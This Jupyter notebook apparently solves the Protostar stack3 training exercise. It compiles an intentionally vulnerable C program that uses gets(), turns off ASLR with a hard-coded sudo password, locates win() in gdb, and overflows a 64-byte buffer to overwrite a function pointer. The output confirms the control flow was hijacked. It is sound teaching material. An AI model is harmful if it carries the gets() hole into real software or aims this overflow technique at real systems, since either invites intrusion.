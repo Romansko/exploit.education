{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "13c10c12",
   "metadata": {},
   "source": [
    "# protostar/stack3 solution\n",
    "\n",
    "https://exploit.education/protostar/stack-three/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e19c27a8",
   "metadata": {},
   "source": [
    "## compile source code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "568dd7b5",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/bin/ld: /tmp/cczb6OtH.o: in function `main':\n",
      "src.c:(.text+0x57): warning: the `gets' function is dangerous and should not be used.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "src = r\"\"\"\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "void win()\n",
    "{\n",
    "  printf(\"code flow successfully changed\\n\");\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  volatile int (*fp)();\n",
    "  char buffer[64];\n",
    "\n",
    "  fp = 0;\n",
    "\n",
    "  gets(buffer);\n",
    "\n",
    "  if(fp) {\n",
    "      printf(\"calling function pointer, jumping to 0x%08x\\n\", fp);\n",
    "      fp();\n",
    "  }\n",
    "  fflush(stdout); // Added because when invoked by shell seg fault halts stdout..\n",
    "}\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "with open(\"src.c\", \"w\") as f:\n",
    "    f.write(src)\n",
    "\n",
    "_ = os.system('gcc src.c -m32 -w -o prog')  # 32bit. disable warnings."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f905ff2",
   "metadata": {},
   "source": [
    "## solution\n",
    "\n",
    "First, we have to find the virtual address of win() function. We can achieve it using gbd.\n",
    "\n",
    "Note that ASLR must be disabled before invoking the application."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "bbf2b5e4",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n",
      "\"win\" is at 0x56556221\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "# Gain root privileges for Kali Linux & Disable ASLR.\n",
    "_ = os.system('''\n",
    "echo \"kali\" | sudo -S -i\n",
    "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n",
    "''')\n",
    "\n",
    "# win() virtual address without ASLR.\n",
    "_ = os.system(\"gdb -batch -ex 'file prog' -ex 'run' -ex 'info address win' | egrep -o '\\\"win\\\".*0x[0-9abcdefABCDEF]{4,8}'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d3f8e62",
   "metadata": {},
   "source": [
    "passing argument string with length > 64 will cause a buffer overflow.\n",
    "The next 4 bytes after the buffer should be the virtual address of win() `0x56556221`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "ec0e683a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "calling function pointer, jumping to 0x56556221\n",
      "code flow successfully changed\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "import subprocess\n",
    "from subprocess import PIPE\n",
    "import struct\n",
    "\n",
    "p = subprocess.Popen(['./prog'],stdin=PIPE, stdout=PIPE)\n",
    "res, err = p.communicate(  b'A'*64 + struct.pack(\"<I\", 0x56556221) )\n",
    "print(res.decode(\"utf-8\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "0525e619",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "import os\n",
    "# Gain root privileges for Kali Linux & RE-Enable ASLR.\n",
    "_ = os.system('''\n",
    "echo \"kali\" | sudo -S -i\n",
    "echo 2 | sudo tee /proc/sys/kernel/randomize_va_space\n",
    "''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "2146293d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python version\n",
      "3.9.10 (main, Jan 16 2022, 17:12:18) \n",
      "[GCC 11.2.0]\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "print(\"Python version\")\n",
    "print (sys.version)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a2ea1f23",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
